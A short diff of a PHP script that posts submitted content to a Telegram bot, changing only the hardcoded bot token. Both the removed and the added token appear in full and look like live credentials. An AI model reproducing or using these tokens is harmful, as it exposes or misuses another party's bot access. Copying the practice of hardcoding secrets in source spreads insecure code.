@@ -13,7 +13,7 @@ $content = $_POST['content'];
 $icon = "exclamation-circle";
 $isAlerted = false;
 $type = "account";
-$botToken = '6636627040:AAE_pLLKcpRpotS90TcV3_8zVFifoV2EwJ0';
+$botToken = '7924767611:AAExdMrywUPKpVIBWMowG_gmm_pmREg50kQ';
 $apiURL = "https://api.telegram.org/bot$botToken/sendMessage";
 
 if(!isset($userID) || !isset($content)){
